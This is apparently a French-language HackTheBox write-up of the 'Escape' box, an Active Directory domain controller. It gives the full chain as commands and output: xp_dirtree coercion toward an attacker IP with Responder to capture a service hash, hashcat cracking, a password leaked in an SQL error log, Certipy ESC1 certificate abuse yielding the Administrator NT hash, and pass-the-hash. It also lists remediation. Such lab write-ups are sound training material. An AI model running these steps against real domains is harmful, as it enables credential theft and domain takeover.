# Escape — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows (contrôleur de domaine) |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-09 |
| **Vecteur** | Creds dans un partage public → MSSQL invité → coercition `xp_dirtree` → hash NetNTLMv2 `sql_svc` cracké → ERRORLOG fuit le mdp de `Ryan.Cooper` → ADCS **ESC1** → hash NT de l'Administrator |
| **CVE** | — (abus de config ADCS) |
| **Tags** | active-directory · mssql · adcs · esc1 · certipy |

> 🎯 **Nouveautés apprises — ma 1re box ADCS** :
> 1) **MSSQL** accessible en invité : `xp_dirtree` vers mon IP force le service à **s'authentifier chez moi** → je capture son hash NetNTLMv2 avec Responder → hashcat `-m 5600`.
> 2) **ADCS — ESC1** : un **template** laisse l'enrôleur **choisir le sujet (SAN)** → je demande un certif **au nom de l'Administrator**. Outil : **Certipy** (`find` → `req` → `auth`).
> 3) Un certificat = **authentification Kerberos (PKINIT)** → Certipy me rend le **hash NT** → Pass-the-Hash.

---

## TL;DR
1. Partage SMB `Public` en anonyme → PDF qui lâche un compte MSSQL invité (`PublicUser:GuestUserCantWrite1`).
2. Connexion MSSQL → `xp_dirtree \\MON_IP\x` + **Responder** → capture le NetNTLMv2 de **`sql_svc`** → hashcat → `REGGIE1234ronnie`.
3. WinRM en `sql_svc` → un **`ERRORLOG.BAK`** contient un essai de login où le **mot de passe de `Ryan.Cooper`** a été tapé dans le champ user → `NuclearMosquito3`.
4. `certipy find -vulnerable` → template **`UserAuthentication`** vulnérable **ESC1**.
5. `certipy req` en imposant `-upn administrator@sequel.htb` → `administrator.pfx` → `certipy auth` → **hash NT de l'Administrator** → `evil-winrm -H`.

## 1. Reconnaissance
```bash
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ nmap -sC -sV -p- 10.129.228.253                                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 20:04 +0200
Nmap scan report for 10.129.228.253
Host is up (0.024s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-07 02:06:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-07T02:08:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-07T02:08:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-10-07T02:08:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-10-07T02:03:57
|_Not valid after:  2056-10-07T02:03:57
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-10-07T02:08:17+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-10-07T02:08:17+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-07T02:07:38
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
```

> ⏱️ **À noter dès le nmap** : `clock-skew: +8h`. C'est ce qui va poser `KRB_AP_ERR_SKEW` plus tard sur le `certipy auth` → il faudra caler l'horloge (cf. pièges).

```bash
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ smbclient -L  //10.129.228.253/ -N 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 

┌──(kali㉿kali)-[~/nmap/Escape]
└─$ smbclient //10.129.228.253/Public -N -c 'recurse ON; prompt OFF; mget *'
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (355,8 KiloBytes/sec) (average 355,8 KiloBytes/sec)
```
Dans le PDF (section « Bonus ») :
> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user **PublicUser** and password **GuestUserCantWrite1**.

## 2. Foothold
**Étape 2a — capturer le hash de `sql_svc` par coercition MSSQL.** On lance Responder qui écoute, puis depuis le shell MSSQL on force le serveur à aller s'authentifier sur notre partage bidon (`xp_dirtree \\MON_IP\x`). Le chemin **UNC vers l'attaquant** est ce qui déclenche l'authentification sortante.
```bash
┌──(kali㉿kali)-[/]
└─$ sudo responder -I tun0

┌──(kali㉿kali)-[~/nmap/Escape]
└─$ impacket-mssqlclient  PublicUser:'GuestUserCantWrite1'@10.129.228.253 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.236\test
subdirectory   depth   file   
------------   -----   ----   

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:d61c57d6644a232f:89B0B65223F46457C8B5E732C8AB9721:0101000000000000...(tronqué)

┌──(kali㉿kali)-[~/nmap/Escape]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
...
SQL_SVC::sequel:...:REGGIE1234ronnie
```
> `-m 5600` = NetNTLMv2. Le mot de passe de `sql_svc` : **`REGGIE1234ronnie`**.

**Étape 2b — WinRM en `sql_svc`, puis lire les logs SQL qui fuient un mdp.**
```bash
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ evil-winrm -i 10.129.228.253 -u SQL_SVC -p 'REGGIE1234ronnie'

Evil-WinRM* PS C:\Users> ls
    Directory: C:\Users
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc

Evil-WinRM* PS C:\Users\sql_svc\Documents> gci C:\ -r -fi "ERROR*.*" -ea 0
    Directory: C:\SQLServer\Logs
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK

2022-11-18 13:43:07.44 Logon  Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon  Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```
> 🔑 Le classique : Ryan a tapé son **mot de passe dans le champ "user"** par erreur. Le log enregistre `Ryan.Cooper` puis `NuclearMosquito3` sur la ligne d'après → c'est **son mot de passe**. Compte : `ryan.cooper:NuclearMosquito3`.

## 3. Privesc — ADCS ESC1
**Étape 3a — repérer le template vulnérable.** `-vulnerable` applique la grille ESC tout seul et colle le verdict en bas.
```bash
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ certipy-ad find -u 'ryan.cooper@SEQUEL.HTB' -password 'NuclearMosquito3' -dc-ip 10.129.228.253 -dc-host dc.sequel.htb -vulnerable -stdout
...
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
**La grille ESC1 cochée ici** : `Enrollee Supplies Subject = True` **+** `Client Authentication = True` **+** `Enrollment Rights` contient `Domain Users` (donc ryan) **+** `Requires Manager Approval = False` **+** `Authorized Signatures Required = 0`. Nom du template = **`UserAuthentication`**, CA = **`sequel-DC-CA`**.

**Étape 3b — demander le certif au nom de l'Administrator.**
```bash
# ❌ Ma 1re tentative (ratée) — pour mémoire :
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ certipy-ad req -username ryan.cooper@sequel.htb -password 'NuclearMosquito3' -target-ip sequel.htb -ca 'sequel-DC-CA' -template 'ESC1' -upn 'administrator@sequel.local' -sid '...'
[!] DNS resolution failed: ...SEQUEL.HTB...
[-] CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.

# 3 erreurs :
#  1) -template 'ESC1'  → ESC1 est le NOM DE LA FAILLE, pas du template. Le vrai nom = UserAuthentication.
#  2) -upn ...@sequel.local → mauvais domaine, c'est sequel.htb.
#  3) -target-ip sequel.htb → -target-ip attend une IP, pas un nom (d'où le DNS failed).

# ✅ La commande corrigée (ajouter d'abord dc.sequel.htb dans /etc/hosts) :
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ echo '10.129.228.253 dc.sequel.htb sequel.htb' | sudo tee -a /etc/hosts
└─$ certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
    -dc-ip 10.129.228.253 -target dc.sequel.htb \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'administrator@sequel.htb'
[*] Saved certificate and private key to 'administrator.pfx'
```

**Étape 3c — s'authentifier avec le certif → récupérer le hash NT.**
```bash
# L'horloge locale est ~8h derrière le DC → KRB_AP_ERR_SKEW.
# ntpdate ne TIENT PAS (VirtualBox resync l'heure en boucle) → faketime, offset mesuré = +28803s.
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ faketime "$(date -d '+28803 seconds' '+%Y-%m-%d %H:%M:%S')" \
  certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

**Étape 3d — Pass-the-Hash → shell Administrator.**
```bash
┌──(kali㉿kali)-[~/nmap/Escape]
└─$ evil-winrm -i 10.129.228.253 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
# → user.txt (bureau de Ryan.Cooper) et root.txt (bureau Administrator)
```

## 4. Remédiation
- **Durcir le template `UserAuthentication`** : retirer `Enrollee Supplies Subject` (le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) — c'est lui qui laisse choisir le SAN.
- Restreindre les **droits d'enrôlement** : pas de `Domain Users` sur un template à authentification client.
- Activer **Manager Approval** et/ou exiger des **signatures autorisées** sur les templates sensibles.
- Ne pas stocker de creds dans un partage public ; purger les `ERRORLOG` qui fuitent des logins ; retirer le compte MSSQL invité.
- Désactiver `xp_dirtree`/l'accès sortant du compte de service SQL.

## 5. Leçons
- **ADCS = nouvelle surface énorme.** `certipy find -vulnerable -stdout` fait le diagnostic ESC1→ESC16 à ma place ; je dois savoir lire la grille à la main quand même.
- **ESC1** = `Enrollee Supplies Subject` + `Client Authentication` + droit d'enrôler + pas d'approbation. Je demande un cert **au nom de n'importe qui** via `-upn`.
- Le **nom du template ≠ le nom de la faille** : `-template` prend `UserAuthentication`, jamais `ESC1`.
- Un **certificat vaut une authentification** (PKINIT) → Certipy en tire le **hash NT** → Pass-the-Hash, pas besoin du mot de passe.
- `xp_dirtree \\MON_IP\x` : un **chemin UNC vers moi** force le service MSSQL à s'authentifier → capture du NetNTLMv2.
- Un **mdp tapé dans le champ user** finit en clair dans les logs → toujours lire les `ERRORLOG`.

## ⚠️ Pièges rencontrés
- **`-template 'ESC1'`** → `CERTSRV_E_UNSUPPORTED_CERT_TYPE`. ESC1 n'est pas un template : mettre le vrai nom (`UserAuthentication`).
- **`-upn administrator@sequel.local`** → mauvais domaine, c'est `sequel.htb`.
- **`-target-ip sequel.htb`** → `-target-ip` attend une **IP** ; pour un nom utiliser `-target dc.sequel.htb` + l'ajouter dans `/etc/hosts` (sinon `DNS resolution failed`).
- **`KRB_AP_ERR_SKEW`** sur `auth` : offset +8h ici. `ntpdate` **ne tient pas** sous VirtualBox (Guest Additions resync en boucle) → utiliser **`faketime '+28803s'`** (offset **mesuré sur CETTE box**, pas recopié d'une autre). Fix permanent : `VBoxManage setextradata "VM" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1`.

## Références
- Fiches liées : [ad-memo](../outils/ad-memo.md) · [bloodhound](../outils/bloodhound.md) · [hashcat](../outils/hashcat.md) · [impacket](../outils/impacket.md)
